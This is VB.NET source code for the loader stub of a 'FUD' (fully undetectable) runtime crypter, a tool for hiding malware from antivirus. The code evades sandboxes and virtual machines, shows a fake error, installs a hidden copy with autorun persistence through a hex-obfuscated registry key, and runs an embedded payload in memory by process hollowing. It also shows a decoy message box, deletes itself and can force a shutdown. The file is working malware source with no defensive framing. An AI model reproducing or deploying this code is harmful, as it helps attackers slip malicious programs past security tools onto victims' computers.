'=============================================================================
'                  Crypter.NET - FUD Runtime crypter 
'                 Copyright (C) 2010 fLaSh - Carlos.DF 
'                        <c4rl0s.pt@gmail.com> 
'                     <http://www.flash1337.com/>
' THIS SOFTWARE IS PROVIDED BY THE AUTHORS ``AS IS'' AND ANY EXPRESS OR
' IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
' OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
' IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DIRECT, INDIRECT,
' INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
' NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
' DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
' THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
' (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
' THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
'=============================================================================
Imports System.IO
Imports Microsoft.Win32.Registry
Public Class Dummy

    Private Sub Dummy_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Try
 
            Dim oSettings As New Settings
            Dim oRunPE As RunPE

            If Not oSettings.Alright Then
                Return
            End If

            If oSettings.AntiSandboxie Then
                Dim oDetectVM As New DetectVM
                If Not oDetectVM.CheckMyProcess = DetectVM.MyProcessEx.NORMAL Then
                    'MSG: Security sandbox violation: caller 0x11 cannot access LoaderInfo.applicationDomain owned by 0x3211.
                    Dim sFakeError As String = HexToString("0x53656375726974792073616e64626f782076696f6c6174696f6e3a2063616c6c657220307831312063616e6e6f7420616363657373204c6f61646572496e666f2e6170706c69636174696f6e446f6d61696e206f776e6564206279203078333231312e")
                    MessageBox.Show(sFakeError, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    End
                End If
            End If

            If oSettings.Install Then
                ' Need to install?
                If Not oSettings.InstallPath.Equals(Application.ExecutablePath) Then
                    IO.File.Copy(Application.ExecutablePath, oSettings.InstallPath)
                    ' Put exe hidden?
                    If oSettings.InstallHidden Then
                        File.SetAttributes(oSettings.InstallPath, File.GetAttributes(oSettings.InstallPath) Or FileAttributes.System Or FileAttributes.Hidden)
                    End If
                    ' Add autorun?
                    If oSettings.InstallAddAutoRun Then
                        Dim sKEY As String = HexToString("0x536f6674776172655c4d6963726f736f66745c57696e646f77735c43757272656e7456657273696f6e5c52756e")
                        Using o As Microsoft.Win32.RegistryKey = _
                                CurrentUser.OpenSubKey(sKEY, True)
                            o.SetValue("0x1234921101", Application.ExecutablePath)
                        End Using
                    End If
                    Threading.Thread.Sleep(1000)
                    Process.Start(oSettings.InstallPath)
                    Threading.Thread.Sleep(1000)
                    End
                End If
            End If

            Dim sProcessPath As String
            If oSettings.ProcessInject Then
                If IO.File.Exists(oSettings.ProcessInjectPath) Then
                    sProcessPath = oSettings.ProcessInjectPath
                Else
                    sProcessPath = Application.ExecutablePath
                End If
            Else
                sProcessPath = Application.ExecutablePath
            End If

            ' Run PE now!
            oRunPE = New RunPE
            oRunPE.SRexec(oSettings.EXE, sProcessPath)

            ' Show fake messagebox..
            If oSettings.FakeMessageBox Then
                Dim iIcon As MessageBoxIcon
                Select Case oSettings.FakeMessageBoxIcon
                    Case 0 : iIcon = MessageBoxIcon.Asterisk
                    Case 1 : iIcon = MessageBoxIcon.Error
                    Case 2 : iIcon = MessageBoxIcon.Exclamation
                    Case 3 : iIcon = MessageBoxIcon.Hand
                    Case 4 : iIcon = MessageBoxIcon.Information
                    Case 5 : iIcon = MessageBoxIcon.None
                    Case 6 : iIcon = MessageBoxIcon.Question
                    Case 7 : iIcon = MessageBoxIcon.Stop
                    Case 8 : iIcon = MessageBoxIcon.Warning
                End Select
                Dim iButtons As MessageBoxButtons
                Select Case oSettings.FakeMessageBoxButtons
                    Case 0 : iButtons = MessageBoxButtons.AbortRetryIgnore
                    Case 1 : iButtons = MessageBoxButtons.OK
                    Case 2 : iButtons = MessageBoxButtons.OKCancel
                    Case 3 : iButtons = MessageBoxButtons.RetryCancel
                    Case 4 : iButtons = MessageBoxButtons.YesNo
                    Case 5 : iButtons = MessageBoxButtons.YesNoCancel
                End Select
                MessageBox.Show(oSettings.FakeMessageBoxText, oSettings.FakeMessageBoxTitle, iButtons, iIcon)
            End If

            If oSettings.StubSuiecide Then
                Threading.Thread.Sleep(oSettings.StubSuiecideWait * 1000)
                ' Load and descompress the Stub
                Dim bytStub() As Byte = Compression.Decompress(My.Resources.Stub_Suiecide)
                ' Run PE now!
                oRunPE = New RunPE
                oRunPE.SRexec(bytStub, Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory & "\MSBuild.exe" & " " & Application.ExecutablePath)
            End If

            If oSettings.Shutdown Then
                Dim oShutdown As New Shutdown
                Select Case oSettings.ShutdownType
                    Case 0 : oShutdown.Reboot()
                    Case 1 : oShutdown.ShutDown()
                    Case 2 : oShutdown.LogOff()
                End Select
            End If

            oSettings = Nothing

        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        Finally
            Application.Exit()
        End Try
    End Sub

End Class